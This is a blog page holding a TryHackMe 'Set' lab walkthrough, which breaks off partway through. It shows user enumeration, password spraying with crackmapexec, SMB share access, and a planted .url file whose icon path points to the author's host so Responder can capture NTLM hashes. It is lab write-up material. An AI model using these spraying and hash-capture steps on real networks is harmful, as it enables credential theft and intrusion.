@@ -1,0 +1,693 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <link rel="icon" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Mosaic Theory">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Once again you find yourself on the internal network of the Windcorp Corporation. This tasted so good last time you were there, you came back for more. However, they managed to secure the Domain Contr">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TryHackMe-Set">
+<meta property="og:url" content="http://example.com/2022/10/06/TryHackMe-Set/index.html">
+<meta property="og:site_name" content="Personal Cloud Note">
+<meta property="og:description" content="Once again you find yourself on the internal network of the Windcorp Corporation. This tasted so good last time you were there, you came back for more. However, they managed to secure the Domain Contr">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220710150233449.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220710145937320.png">
+<meta property="article:published_time" content="2022-10-06T11:30:34.885Z">
+<meta property="article:modified_time" content="2022-07-10T10:33:31.000Z">
+<meta property="article:author" content="Crazyinside">
+<meta property="article:tag" content="Active Directory">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://www.worldisend.com/img/image-20220710150233449.png">
+  
+  
+  
+  <title>TryHackMe-Set - Personal Cloud Note</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://www.worldisend.com/fluid/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Crazyinside&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://www.worldisend.com/fluid/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="TryHackMe-Set"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-10-06 19:30" pubdate>
+          October 6, 2022 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          12k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          101 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">TryHackMe-Set</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>Once again you find yourself on the internal network of the Windcorp Corporation. This tasted so good last time you were there, you came back for more.</p>
+<p>However, they managed to secure the Domain Controller this time, so you need to find another server and on your first scan discovered “Set”.</p>
+<p>Set is used as a platform for developers and has had some problems in the recent past. They had to reset a lot of users and restore backups (maybe you were not the only hacker on their network?). So they decided to make sure all users used proper passwords and closed of some of the loose policies. Can you still find a way in? Are some user more privileged than others? Or some more sloppy? And maybe you need to think outside the box a little bit to circumvent their new security controls…</p>
+<p>Happy Hacking!</p>
+<h6 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Nmap 7.92SVN scan initiated Sun Jul 10 14:42:57 2022 as: nmap -sC -sV -p- -Pn -T4 -oA set 10.10.1.212</span><br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.1.212<br>Host is up (0.29s latency).<br>Not shown: 65530 filtered tcp ports (no-response)<br>PORT      STATE SERVICE       VERSION<br>135/tcp   open  msrpc         Microsoft Windows RPC<br>443/tcp   open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>| ssl-cert: Subject: commonName=set.windcorp.thm<br>| Subject Alternative Name: DNS:set.windcorp.thm, DNS:seth.windcorp.thm<br>| Not valid before: 2020-06-07T15:00:22<br>|_Not valid after:  2036-10-07T15:10:21<br>|_ssl-<span class="hljs-built_in">date</span>: 2022-07-10T06:50:05+00:00; 0s from scanner time.<br>| tls-alpn: <br>|_  http/1.1<br>|_http-title: Not Found<br>445/tcp   open  microsoft-ds?<br>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>|_http-title: Not Found<br>|_http-server-header: Microsoft-HTTPAPI/2.0<br>49666/tcp open  msrpc         Microsoft Windows RPC<br>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>| smb2-security-mode: <br>|   311: <br>|_    Message signing enabled but not required<br>| smb2-time: <br>|   <span class="hljs-built_in">date</span>: 2022-07-10T06:48:57<br>|_  start_date: N/A<br><br>Service detection performed. Please report any incorrect results at https://google.com/submit/ .<br><span class="hljs-comment"># Nmap done at Sun Jul 10 14:50:13 2022 -- 1 IP address (1 host up) scanned in 435.47 seconds</span><br></code></pre></td></tr></table></figure>
+
+<h6 id="Flag1-txt"><a href="#Flag1-txt" class="headerlink" title="Flag1.txt:"></a>Flag1.txt:</h6><p>查看证书还能看到另一个主题域名：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">seth.windcorp.thm<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ whatweb https://set.windcorp.thm/<br>https://set.windcorp.thm/ [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[contact@windcorp.thm,info@windcorp.thm], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.1.212], JQuery, Microsoft-IIS[10.0], Script, Title[Set]<br></code></pre></td></tr></table></figure>
+
+<img src="https://www.worldisend.com/img/image-20220710150233449.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220710150233449" style="zoom:150%;" />
+
+<p><img src="https://www.worldisend.com/img/image-20220710145937320.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220710145937320"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">Max Douglas<br>Marjorie Adams<br>Nathaniel Martin<br>Roberta Phillips<br>Julio Craig<br>Holly Welch<br>Jose Byrd<br>Hugh Foster<br>Addison Russell<br></code></pre></td></tr></table></figure>
+
+<p>在调速器中查看js源码：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">searchFor</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">var</span> xmlhttp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>  xmlhttp.<span class="hljs-property">onreadystatechange</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">readyState</span> == <span class="hljs-number">4</span> &amp;&amp; <span class="hljs-variable language_">this</span>.<span class="hljs-property">status</span> == <span class="hljs-number">200</span>) &#123;<br>      <span class="hljs-title function_">myFunction</span>(<span class="hljs-variable language_">this</span>);<br>    &#125;<br>  &#125;;<br>  xmlhttp.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;assets/data/users.xml&quot;</span> , <span class="hljs-literal">true</span>);<br>  xmlhttp.<span class="hljs-title function_">send</span>();<br>&#125;<br><br><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">myFunction</span>(<span class="hljs-params">xml</span>) &#123;<br>    xmlDoc = xml.<span class="hljs-property">responseXML</span>;<br>    x = xmlDoc.<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">&quot;row&quot;</span>);<br>    input = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;input&quot;</span>).<span class="hljs-property">value</span>;<br>    size = input.<span class="hljs-property">length</span>;<br>    <span class="hljs-keyword">if</span> (input == <span class="hljs-literal">null</span> || input == <span class="hljs-string">&quot;&quot;</span>)<br>    &#123;<br>        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;results&quot;</span>).<span class="hljs-property">innerHTML</span>= <span class="hljs-string">&quot;Please enter a character or name!&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>;i&lt;x.<span class="hljs-property">length</span>;i++)<br>    &#123;<br>	name = xmlDoc.<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">&quot;name&quot;</span>)[i].<span class="hljs-property">childNodes</span>[<span class="hljs-number">0</span>].<span class="hljs-property">nodeValue</span>;<br>        startString = name.<span class="hljs-title function_">substring</span>(<span class="hljs-number">0</span>,size);<br> 	<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(input)<br>        <span class="hljs-keyword">if</span> (startString.<span class="hljs-title function_">toLowerCase</span>() == input.<span class="hljs-title function_">toLowerCase</span>())<br> 	<br>	<br>        &#123;<br>            name = xmlDoc.<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">&quot;name&quot;</span>)[i].<span class="hljs-property">childNodes</span>[<span class="hljs-number">0</span>].<span class="hljs-property">nodeValue</span>;<br>            phone = xmlDoc.<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">&quot;phone&quot;</span>)[i].<span class="hljs-property">childNodes</span>[<span class="hljs-number">0</span>].<span class="hljs-property">nodeValue</span>;<br>            email = xmlDoc.<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">&quot;email&quot;</span>)[i].<span class="hljs-property">childNodes</span>[<span class="hljs-number">0</span>].<span class="hljs-property">nodeValue</span>;<br>            divText = <span class="hljs-string">&quot;&lt;table border=1&gt;&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Phone&lt;/th&gt;&lt;th&gt;Email&lt;/th&gt;&lt;/tr&gt;&quot;</span> + <span class="hljs-string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span> + name + <span class="hljs-string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span> + phone + <span class="hljs-string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span> + email + <span class="hljs-string">&quot;&lt;/td&gt;&lt;/tr&gt;&quot;</span> + <span class="hljs-string">&quot;&lt;/table&gt;&quot;</span>;<br>           <br>	    <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            divText = <span class="hljs-string">&quot;&lt;h2&gt;The contact does not exist.&lt;/h2&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;results&quot;</span>).<span class="hljs-property">innerHTML</span>= divText;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ curl -k --insecure https://set.windcorp.thm/assets/data/users.xml|grep <span class="hljs-string">&quot;email&quot;</span>|awk -F <span class="hljs-string">&quot;&lt;&quot;</span> <span class="hljs-string">&#x27;&#123; print $2&#125;&#x27;</span>|awk -F <span class="hljs-string">&quot;&gt;&quot;</span> <span class="hljs-string">&#x27;&#123; print $2&#125;&#x27;</span>|awk -F <span class="hljs-string">&quot;@&quot;</span> <span class="hljs-string">&#x27;&#123; print $1&#125;&#x27;</span> &gt; users.txt<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><code class="hljs bash">aaronwhe<br>addisonrus<br>aidenboy<br>alicepet<br>allisonnea<br>alyssabak<br>andreacur<br>andreahar<br>andreaste<br>andrewpow<br>aubreehop<br>beckywel<br>bernardmck<br>billiehil<br>billierya<br>brandonspe<br>brandyrod<br>braydenhaw<br>braydenweb<br>byronwil<br>calebrod<br>chloewes<br>christinerui<br>clairehay<br>craigmcd<br>danaros<br>danielletho<br>darrellpea<br>donbur<br>donper<br>ednahow<br>ednaper<br>ednarey<br>eugenewoo<br>fernandohun<br>flennrod<br>floydpet<br>gabrielall<br>gertrudewil<br>gilberttay<br>glendasny<br>gordonban<br>harveyrey<br>heidiwat<br>herminiacol<br>hollywel<br>hughfos<br>ivanray<br>jamiegra<br>janicekim<br>jasonper<br>jaydenhun<br>jillbec<br>jimmiebar<br>jimmypor<br>josebyr<br>juanitaram<br>juliocra<br>kayhar<br>kellyjen<br>kittymar<br>kristinfre<br>leahbur<br>leahlar<br>lenamoo<br>lesarog<br>maegut<br>marjorieada<br>masonmor<br>maxdou<br>meghancha<br>meghanhol<br>michellewat<br>miriamwar<br>myrtleowe<br>nataliearm<br>nataliepen<br>nathanielmar<br>nicholasram<br>normanand<br>normantur<br>owenkel<br>pamelagre<br>peggyhal<br>pennyray<br>peytonjam<br>phyllisric<br>priscillanew<br>randygre<br>reneeluc<br>rickyree<br>robertaphi<br>rodneyhen<br>rogermey<br>rosemarywes<br>rosenew<br>rosspow<br>roymas<br>rubensch<br>sallyhan<br>sallyort<br>sallyste<br>salvadorlee<br>sethhic<br>sohamkel<br>sohamtuc<br>sophiaboy<br>stephanierey<br>susansta<br>tammyjoh<br>thomasweb<br>tomand<br>veranic<br>vivangar<br>waderey<br>walterpal<br>waynewoo<br>wendyrob<br>wyattwhe<br>zacksul<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ crackmapexec smb set.windcorp.thm -u users.txt -p passwd | grep <span class="hljs-string">&#x27;[+]&#x27;</span><br>SMB         10.10.1.212     445    SET              [+] SET\myrtleowe:Passw@rd <br>$ smbclient -L //10.10.1.212 -U myrtleowe <br>Enter WORKGROUP\myrtleowe<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string"></span><br><span class="hljs-string">	Sharename       Type      Comment</span><br><span class="hljs-string">	---------       ----      -------</span><br><span class="hljs-string">	ADMIN$          Disk      Remote Admin</span><br><span class="hljs-string">	C$              Disk      Default share</span><br><span class="hljs-string">	E$              Disk      Default share</span><br><span class="hljs-string">	Files           Disk      </span><br><span class="hljs-string">	IPC$            IPC       Remote IPC</span><br><span class="hljs-string">SMB1 disabled -- no workgroup available</span><br><span class="hljs-string">$ smbclient //10.10.1.212/Files -U myrtleowe </span><br><span class="hljs-string">Enter WORKGROUP\myrtleowe&#x27;</span>s password: <br>Try <span class="hljs-string">&quot;help&quot;</span> to get a list of possible commands.<br>smb: \&gt; <span class="hljs-built_in">ls</span><br>  .                                   D        0  Wed Jun 17 05:08:26 2020<br>  ..                                  D        0  Wed Jun 17 05:08:26 2020<br>  Info.txt                            A      123  Wed Jun 17 05:57:12 2020<br>smb: \&gt; mget Info.txt<br>Get file Info.txt? y<br><br>$ <span class="hljs-built_in">cat</span> Info.txt <br>Zip and save your project files here. <br>We will review them<br><br>BTW.<br>Flag1: THM&#123;4...........................&#125;<br></code></pre></td></tr></table></figure>
+
+<h6 id="Flag2-txt"><a href="#Flag2-txt" class="headerlink" title="Flag2.txt:"></a>Flag2.txt:</h6><p>Flag1中的信息说：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">Zip and save your project files here. <br>We will review them<br><br>在此处压缩并保存您的项目文件。<br>我们将审查它们<br></code></pre></td></tr></table></figure>
+
+<p>塞个强制认证：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[InternetShortcut]</span><br><span class="hljs-attr">URL</span>=whatever<br><span class="hljs-attr">WorkingDirectory</span>=whatever<br><span class="hljs-attr">IconFile</span>=\\<span class="hljs-number">10.14</span>.<span class="hljs-number">24.91</span>\%USERNAME%.icon<br><span class="hljs-attr">IconIndex</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ zip myzip.zip hello.url<br>$ smbclient //10.10.1.212/Files -U myrtleowe <br>Enter WORKGROUP\myrtleowe<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="hljs-string">smb: \&gt; put myzip.zip </span><br><span class="hljs-string">putting file myzip.zip as \myzip.zip (0.2 kb/s) (average 0.2 kb/s)</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo responder -I tun0<br>[sudo] crazyinside 的密码：<br>                                         __<br>  .----.-----.-----.-----.-----.-----.--|  |.-----.----.<br>  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|<br>  |__| |_____|_____|   __|_____|__|__|_____||_____|__|<br>                   |__|<br><br>           NBT-NS, LLMNR &amp; MDNS Responder 3.0.6.0<br><br>  Author: Laurent Gaffie (laurent.gaffie@gmail.com)<br>  To <span class="hljs-built_in">kill</span> this 